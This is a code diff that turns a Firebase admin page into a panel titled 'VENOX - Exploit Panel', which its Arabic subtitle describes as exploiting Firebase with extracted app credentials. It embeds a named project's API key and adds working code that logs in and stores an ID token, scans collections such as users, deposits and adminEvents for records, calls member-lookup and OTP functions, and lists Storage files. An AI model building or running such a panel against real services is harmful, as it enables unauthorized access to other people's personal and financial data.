@@ -3,87 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔥 VENOX - لوحة التحكم</title>
+    <title>🔥 VENOX - Exploit Panel</title>
     
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-functions-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-storage-compat.js"></script>
     
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, sans-serif; }
-        body { background: #0a0a14; color: #e2e8f0; min-height: 100vh; padding: 20px; }
-        .container { max-width: 1000px; margin: 0 auto; }
-        
-        .header {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            border-radius: 16px;
-            padding: 20px 28px;
-            margin-bottom: 24px;
-            border: 1px solid rgba(255,255,255,0.05);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 12px;
-        }
+        body { background: #0a0a14; color: #e2e8f0; min-height: 100vh; padding: 16px; }
+        .container { max-width: 1200px; margin: 0 auto; }
+        .header { background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 16px; padding: 20px 28px; margin-bottom: 24px; border: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 12px; }
         .header h1 { font-size: 24px; font-weight: 700; background: linear-gradient(135deg, #f97316, #ef4444); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .header .subtitle { color: #94a3b8; font-size: 14px; }
         .badge { padding: 6px 16px; border-radius: 20px; font-size: 13px; border: 1px solid rgba(249,115,22,0.3); }
         .badge-connected { background: rgba(34,197,94,0.15); color: #4ade80; border-color: rgba(34,197,94,0.3); }
         .badge-error { background: rgba(239,68,68,0.15); color: #f87171; border-color: rgba(239,68,68,0.3); }
         
-        .card {
-            background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.05);
-            border-radius: 12px;
-            padding: 24px;
-            margin-bottom: 20px;
-        }
-        .card h3 { color: #f97316; margin-bottom: 16px; }
+        .card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.05); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
+        .card h3 { color: #f97316; margin-bottom: 12px; }
         
-        .form-group { margin-bottom: 14px; }
-        .form-group label { display: block; color: #94a3b8; font-size: 13px; margin-bottom: 4px; }
-        .form-group input {
-            width: 100%;
-            padding: 10px 14px;
-            border-radius: 8px;
-            border: 1px solid rgba(255,255,255,0.08);
-            background: rgba(255,255,255,0.04);
-            color: #e2e8f0;
-            font-size: 14px;
-            outline: none;
-        }
-        .form-group input:focus { border-color: #f97316; }
-        
-        .btn { padding: 10px 22px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; }
+        .btn { padding: 10px 20px; border: none; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; margin: 4px; }
         .btn-primary { background: #f97316; color: #fff; }
         .btn-primary:hover { background: #ea580c; transform: translateY(-2px); }
         .btn-success { background: #22c55e; color: #fff; }
         .btn-success:hover { background: #16a34a; transform: translateY(-2px); }
-        .btn-secondary { background: rgba(255,255,255,0.08); color: #e2e8f0; }
-        .btn-secondary:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
         .btn-danger { background: #ef4444; color: #fff; }
         .btn-danger:hover { background: #dc2626; transform: translateY(-2px); }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+        .btn-secondary { background: rgba(255,255,255,0.08); color: #e2e8f0; }
+        .btn-secondary:hover { background: rgba(255,255,255,0.15); transform: translateY(-2px); }
         
-        .result-box {
-            background: rgba(0,0,0,0.3);
-            padding: 16px;
-            border-radius: 10px;
-            font-family: monospace;
-            font-size: 13px;
-            color: #94a3b8;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 250px;
-            overflow: auto;
-            margin-top: 12px;
-        }
+        .result-box { background: rgba(0,0,0,0.3); padding: 14px; border-radius: 10px; font-family: monospace; font-size: 13px; color: #94a3b8; white-space: pre-wrap; word-break: break-all; max-height: 300px; overflow: auto; margin-top: 10px; }
         .result-box.success { border: 1px solid rgba(34,197,94,0.3); color: #4ade80; }
         .result-box.error { border: 1px solid rgba(239,68,68,0.3); color: #f87171; }
         
-        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
         @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
+        
+        .form-group { margin-bottom: 12px; }
+        .form-group label { display: block; color: #94a3b8; font-size: 13px; margin-bottom: 4px; }
+        .form-group input { width: 100%; padding: 10px 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.08); background: rgba(255,255,255,0.04); color: #e2e8f0; font-size: 14px; outline: none; }
+        .form-group input:focus { border-color: #f97316; }
         
         .toast { position: fixed; bottom: 24px; right: 24px; padding: 14px 24px; border-radius: 12px; color: #fff; font-size: 14px; font-weight: 500; z-index: 999; animation: slideUp 0.3s ease; max-width: 450px; }
         .toast-success { background: #22c55e; }
@@ -97,35 +59,68 @@
 <div class="container">
     <div class="header">
         <div>
-            <h1>🔥 VENOX · لوحة التحكم</h1>
-            <div class="subtitle">إنشاء حسابات + عرض المستخدمين</div>
+            <h1>🔥 VENOX · Exploit Panel</h1>
+            <div class="subtitle">استغلال Firebase باستخدام المعلومات المستخرجة</div>
         </div>
-        <span class="badge badge-connected" id="statusBadge">✅ متصل</span>
+        <span class="badge badge-connected" id="statusBadge">✅ جاهز</span>
     </div>
 
+    <!-- Firebase Config -->
+    <div class="card">
+        <h3>🔑 Firebase Config (مستخرج من التطبيق)</h3>
+        <pre style="background:rgba(0,0,0,0.3);padding:12px;border-radius:8px;font-size:12px;color:#94a3b8;overflow:auto;">
+apiKey: AIzaSyCV-SRgZ8Hhw6VXE0Zl0Ob0P5LPCApZPVU
+authDomain: venox-ffe5c.firebaseapp.com
+projectId: venox-ffe5c
+storageBucket: venox-ffe5c.firebasestorage.app
+        </pre>
+    </div>
+
+    <!-- إنشاء حساب -->
+    <div class="card">
+        <h3>🔐 إنشاء حساب جديد</h3>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;">
+            <input type="email" id="signupEmail" placeholder="البريد الإلكتروني" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:200px;">
+            <input type="password" id="signupPassword" placeholder="كلمة المرور" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:150px;" value="Test123!">
+            <button class="btn btn-success" onclick="createAccount()">🚀 إنشاء</button>
+        </div>
+        <div id="signupResult" class="result-box">⏳ انتظر...</div>
+    </div>
+
+    <!-- تسجيل الدخول -->
+    <div class="card">
+        <h3>🔑 تسجيل الدخول + ID Token</h3>
+        <div style="display:flex;gap:10px;flex-wrap:wrap;">
+            <input type="email" id="loginEmail" placeholder="البريد الإلكتروني" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:200px;">
+            <input type="password" id="loginPassword" placeholder="كلمة المرور" style="flex:1;padding:10px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.1);border-radius:8px;color:#e2e8f0;min-width:150px;" value="Test123!">
+            <button class="btn btn-primary" onclick="login()">🔓 تسجيل</button>
+        </div>
+        <div id="loginResult" class="result-box">⏳ انتظر...</div>
+    </div>
+
+    <!-- استكشاف -->
     <div class="grid-2">
-        <!-- ===== إنشاء حساب ===== -->
+        <!-- Firestore -->
         <div class="card">
-            <h3>🔐 إنشاء حساب جديد</h3>
-            <div class="form-group">
-                <label>البريد الإلكتروني</label>
-                <input type="email" id="signupEmail" placeholder="example@email.com">
-            </div>
-            <div class="form-group">
-                <label>كلمة المرور</label>
-                <input type="password" id="signupPassword" placeholder="••••••••" value="Test123!">
-            </div>
-            <button class="btn btn-success" onclick="createAccount()">🚀 إنشاء حساب</button>
-            <div id="signupResult" class="result-box">⏳ انتظر...</div>
+            <h3>📄 Firestore Collections</h3>
+            <button class="btn btn-primary" onclick="scanFirestore()">🔍 فحص الكل</button>
+            <div id="firestoreResult" class="result-box">⏳ اضغط "فحص"</div>
         </div>
 
-        <!-- ===== عرض المستخدمين ===== -->
+        <!-- Cloud Functions -->
         <div class="card">
-            <h3>👥 المستخدمين</h3>
-            <button class="btn btn-primary" onclick="loadUsers()">📥 تحميل المستخدمين</button>
-            <button class="btn btn-danger" onclick="clearAll()" style="margin-right:10px;">🗑️ مسح الكل</button>
-            <div id="usersResult" class="result-box">⏳ اضغط "تحميل"</div>
+            <h3>☁️ Cloud Functions</h3>
+            <button class="btn btn-secondary" onclick="callFunction('venoxLookupMemberByEmail', {email:'admin@venox.com'})">📧 Lookup</button>
+            <button class="btn btn-secondary" onclick="callFunction('venoxSendEmailOtp', {email:'test@example.com'})">📨 Send OTP</button>
+            <div id="functionsResult" class="result-box">⏳ اضغط زر</div>
         </div>
+    </div>
+
+    <!-- Storage -->
+    <div class="card">
+        <h3>📁 Firebase Storage</h3>
+        <button class="btn btn-primary" onclick="scanStorage()">🔍 فحص</button>
+        <div id="storageResult" class="result-box">⏳ اضغط "فحص"</div>
     </div>
 </div>
 
@@ -145,6 +140,8 @@ const FIREBASE_CONFIG = {
 firebase.initializeApp(FIREBASE_CONFIG);
 const auth = firebase.auth();
 const db = firebase.firestore();
+const storage = firebase.storage();
+const functions = firebase.functions();
 
 // ============================================================
 // 📌 TOAST
@@ -160,7 +157,7 @@ function showToast(msg, type = 'info') {
 }
 
 // ============================================================
-// 🔐 إنشاء حساب
+// 🔐 CREATE ACCOUNT
 // ============================================================
 async function createAccount() {
     const email = document.getElementById('signupEmail').value.trim();
@@ -173,7 +170,7 @@ async function createAccount() {
         return;
     }
     
-    result.textContent = '⏳ جاري إنشاء الحساب...';
+    result.textContent = '⏳ جاري...';
     result.className = 'result-box';
     
     try {
@@ -191,48 +188,114 @@ async function createAccount() {
 }
 
 // ============================================================
-// 👥 تحميل المستخدمين
+// 🔑 LOGIN + ID Token
 // ============================================================
-async function loadUsers() {
-    const result = document.getElementById('usersResult');
-    result.textContent = '⏳ جاري التحميل...';
+async function login() {
+    const email = document.getElementById('loginEmail').value.trim();
+    const password = document.getElementById('loginPassword').value.trim();
+    const result = document.getElementById('loginResult');
+    
+    if (!email || !password) {
+        result.textContent = '❌ أدخل البريد وكلمة المرور';
+        result.className = 'result-box error';
+        return;
+    }
+    
+    result.textContent = '⏳ جاري...';
     result.className = 'result-box';
     
     try {
-        const snapshot = await db.collection('users').get();
-        let users = [];
-        snapshot.forEach(doc => users.push({ id: doc.id, ...doc.data() }));
-        
-        if (users.length === 0) {
-            result.textContent = '📭 لا يوجد مستخدمين (أو القواعد تمنع القراءة)';
-            result.className = 'result-box';
-            return;
-        }
-        
-        let text = `👥 ${users.length} مستخدم\n${'='.repeat(40)}\n`;
-        users.forEach((u, i) => {
-            text += `${i+1}. ${u.email || '—'} | ${u.role || 'user'} | ${u.uid || u.id}\n`;
-        });
-        result.textContent = text;
+        const userCred = await auth.signInWithEmailAndPassword(email, password);
+        const idToken = await userCred.user.getIdToken();
+        result.textContent = `✅ تم تسجيل الدخول!\nUID: ${userCred.user.uid}\nالبريد: ${userCred.user.email}\n🔑 ID Token: ${idToken.substring(0, 50)}...`;
         result.className = 'result-box success';
+        showToast('✅ تم تسجيل الدخول', 'success');
+        document.getElementById('statusBadge').className = 'badge badge-connected';
+        
+        // حفظ التوكن في LocalStorage
+        localStorage.setItem('venox_idToken', idToken);
     } catch (error) {
         result.textContent = `❌ فشل: ${error.message}`;
         result.className = 'result-box error';
         showToast(`❌ ${error.message}`, 'error');
+        document.getElementById('statusBadge').className = 'badge badge-error';
     }
 }
 
 // ============================================================
-// 🗑️ مسح كل شيء
+// 📄 FIRESTORE SCAN
 // ============================================================
-function clearAll() {
-    document.getElementById('usersResult').textContent = '⏳ اضغط "تحميل"';
-    document.getElementById('usersResult').className = 'result-box';
-    document.getElementById('signupResult').textContent = '⏳ انتظر...';
-    document.getElementById('signupResult').className = 'result-box';
-    document.getElementById('signupEmail').value = '';
-    document.getElementById('signupPassword').value = 'Test123!';
-    showToast('🗑️ تم المسح', 'info');
+async function scanFirestore() {
+    const result = document.getElementById('firestoreResult');
+    result.textContent = '⏳ جاري فحص Firestore...';
+    result.className = 'result-box';
+    
+    const collections = ['users', 'profiles', 'deposits', 'tasks', 'referrals', 'adminEvents', 'taskSubmissions', 'taskCompletions', 'platformNotifications', 'memberNotifications'];
+    let output = '';
+    
+    for (const col of collections) {
+        try {
+            const snap = await db.collection(col).limit(2).get();
+            if (!snap.empty) {
+                const data = snap.docs.map(d => d.data());
+                output += `✅ ${col}: ${snap.size} وثيقة\n   ${JSON.stringify(data[0]).substring(0, 150)}...\n\n`;
+            } else {
+                output += `📭 ${col}: فارغ\n`;
+            }
+        } catch(e) {
+            output += `❌ ${col}: ${e.message}\n`;
+        }
+    }
+    
+    result.textContent = output || '📭 لا توجد نتائج';
+    result.className = 'result-box';
+}
+
+// ============================================================
+// ☁️ CLOUD FUNCTIONS
+// ============================================================
+async function callFunction(name, data) {
+    const result = document.getElementById('functionsResult');
+    result.textContent = `⏳ جاري استدعاء ${name}...`;
+    result.className = 'result-box';
+    
+    try {
+        const callable = functions.httpsCallable(name);
+        const response = await callable(data);
+        result.textContent = `✅ ${name}\n📦 ${JSON.stringify(response.data, null, 2)}`;
+        result.className = 'result-box success';
+    } catch(error) {
+        result.textContent = `❌ ${name}\n${error.message}`;
+        result.className = 'result-box error';
+    }
+}
+
+// ============================================================
+// 📁 STORAGE SCAN
+// ============================================================
+async function scanStorage() {
+    const result = document.getElementById('storageResult');
+    result.textContent = '⏳ جاري فحص Storage...';
+    result.className = 'result-box';
+    
+    try {
+        const listRef = storage.ref('/');
+        const res = await listRef.listAll();
+        if (res.items.length === 0 && res.prefixes.length === 0) {
+            result.textContent = '📭 Storage فارغ (أو ممنوع)';
+            result.className = 'result-box';
+            return;
+        }
+        let output = '📁 الملفات:\n';
+        res.items.forEach(item => output += `  📄 ${item.name}\n`);
+        output += '\n📂 المجلدات:\n';
+        res.prefixes.forEach(prefix => output += `  📁 ${prefix.name}/\n`);
+        result.textContent = output;
+        result.className = 'result-box success';
+    } catch(e) {
+        result.textContent = `❌ فشل: ${e.message}`;
+        result.className = 'result-box error';
+    }
 }
 </script>
 
